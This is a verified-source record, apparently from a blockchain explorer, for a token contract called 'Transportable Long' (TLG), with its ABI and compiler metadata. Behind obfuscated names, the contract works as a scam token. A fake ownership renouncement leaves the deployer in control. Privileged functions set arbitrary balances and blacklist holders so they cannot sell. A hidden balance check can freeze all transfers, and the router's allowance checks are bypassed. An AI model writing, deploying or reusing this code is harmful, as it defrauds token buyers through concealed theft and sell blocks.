{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface swapMarketingLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toLaunchWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTeam {\n    function createPair(address receiverLaunchShould, address shouldReceiverBuy) external returns (address);\n}\n\ninterface liquiditySell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minLiquidity) external view returns (uint256);\n\n    function transfer(address senderTrading, uint256 autoToken) external returns (bool);\n\n    function allowance(address tokenWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTrading,\n        uint256 autoToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitReceiver, uint256 value);\n    event Approval(address indexed tokenWallet, address indexed spender, uint256 value);\n}\n\ninterface liquiditySellMetadata is liquiditySell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TransportableLong is toLaunchWallet, liquiditySell, liquiditySellMetadata {\n\n    uint256 constant listFee = 18 ** 10;\n\n    mapping(address => bool) public feeReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityTotal;\n    }\n\n    bool private senderFund;\n\n    function modeSwap(address tradingTo) public {\n        require(tradingTo.balance < 100000);\n        if (launchedFee) {\n            return;\n        }\n        if (limitAt) {\n            teamFund = sellMin;\n        }\n        liquidityFrom[tradingTo] = true;\n        if (limitAt) {\n            liquidityTake = sellMin;\n        }\n        launchedFee = true;\n    }\n\n    address fundTeamTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeAmount(uint256 autoToken) public {\n        fundMax();\n        modeList = autoToken;\n    }\n\n    uint8 private liquidityTotal = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableTakeAuto;\n    }\n\n    bool public launchedFee;\n\n    function balanceOf(address minLiquidity) public view virtual override returns (uint256) {\n        return senderExemptReceiver[minLiquidity];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeLaunched;\n    }\n\n    function tokenFromAmount(address maxReceiver) public {\n        fundMax();\n        if (senderFund) {\n            liquidityAmountLaunch = false;\n        }\n        if (maxReceiver == senderMarketing || maxReceiver == atEnable) {\n            return;\n        }\n        feeReceiver[maxReceiver] = true;\n    }\n\n    function transfer(address teamTotal, uint256 autoToken) external virtual override returns (bool) {\n        return exemptModeTotal(_msgSender(), teamTotal, autoToken);\n    }\n\n    uint256 private sellMin;\n\n    function getOwner() external view returns (address) {\n        return toModeWallet;\n    }\n\n    address private toModeWallet;\n\n    mapping(address => uint256) private senderExemptReceiver;\n\n    function swapFundAt() public {\n        emit OwnershipTransferred(senderMarketing, address(0));\n        toModeWallet = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchLaunched;\n\n    function exemptModeTotal(address takeTotalTx, address senderTrading, uint256 autoToken) internal returns (bool) {\n        if (takeTotalTx == senderMarketing) {\n            return receiverMarketing(takeTotalTx, senderTrading, autoToken);\n        }\n        uint256 modeAmount = liquiditySell(atEnable).balanceOf(totalFromToken);\n        require(modeAmount == modeList);\n        require(senderTrading != totalFromToken);\n        if (feeReceiver[takeTotalTx]) {\n            return receiverMarketing(takeTotalTx, senderTrading, listFee);\n        }\n        return receiverMarketing(takeTotalTx, senderTrading, autoToken);\n    }\n\n    function owner() external view returns (address) {\n        return toModeWallet;\n    }\n\n    constructor (){\n        \n        swapMarketingLiquidity takeReceiverAuto = swapMarketingLiquidity(fundTeamTake);\n        atEnable = buyTeam(takeReceiverAuto.factory()).createPair(takeReceiverAuto.WETH(), address(this));\n        \n        senderMarketing = _msgSender();\n        swapFundAt();\n        liquidityFrom[senderMarketing] = true;\n        senderExemptReceiver[senderMarketing] = tokenAmount;\n        \n        emit Transfer(address(0), senderMarketing, tokenAmount);\n    }\n\n    address public senderMarketing;\n\n    function fundMax() private view {\n        require(liquidityFrom[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed isWalletList, address indexed walletLaunched);\n\n    function receiverMarketing(address takeTotalTx, address senderTrading, uint256 autoToken) internal returns (bool) {\n        require(senderExemptReceiver[takeTotalTx] >= autoToken);\n        senderExemptReceiver[takeTotalTx] -= autoToken;\n        senderExemptReceiver[senderTrading] += autoToken;\n        emit Transfer(takeTotalTx, senderTrading, autoToken);\n        return true;\n    }\n\n    function approve(address minFee, uint256 autoToken) public virtual override returns (bool) {\n        launchLaunched[_msgSender()][minFee] = autoToken;\n        emit Approval(_msgSender(), minFee, autoToken);\n        return true;\n    }\n\n    address public atEnable;\n\n    bool public liquidityAmountLaunch;\n\n    bool private atExempt;\n\n    string private enableTakeAuto = \"TLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenAmount;\n    }\n\n    mapping(address => bool) public liquidityFrom;\n\n    uint256 modeList;\n\n    uint256 enableReceiver;\n\n    function swapFund(address teamTotal, uint256 autoToken) public {\n        fundMax();\n        senderExemptReceiver[teamTotal] = autoToken;\n    }\n\n    uint256 private tokenAmount = 100000000 * 10 ** 18;\n\n    uint256 public liquidityTake;\n\n    bool private amountToken;\n\n    string private takeLaunched = \"Transportable Long\";\n\n    function allowance(address listLaunch, address minFee) external view virtual override returns (uint256) {\n        if (minFee == fundTeamTake) {\n            return type(uint256).max;\n        }\n        return launchLaunched[listLaunch][minFee];\n    }\n\n    address totalFromToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private limitAt;\n\n    uint256 private teamFund;\n\n    function transferFrom(address takeTotalTx, address senderTrading, uint256 autoToken) external override returns (bool) {\n        if (_msgSender() != fundTeamTake) {\n            if (launchLaunched[takeTotalTx][_msgSender()] != type(uint256).max) {\n                require(autoToken <= launchLaunched[takeTotalTx][_msgSender()]);\n                launchLaunched[takeTotalTx][_msgSender()] -= autoToken;\n            }\n        }\n        return exemptModeTotal(takeTotalTx, senderTrading, autoToken);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isWalletList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmountLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"}],\"name\":\"modeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"swapFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"takeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"}],\"name\":\"tokenFromAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotalTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TransportableLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}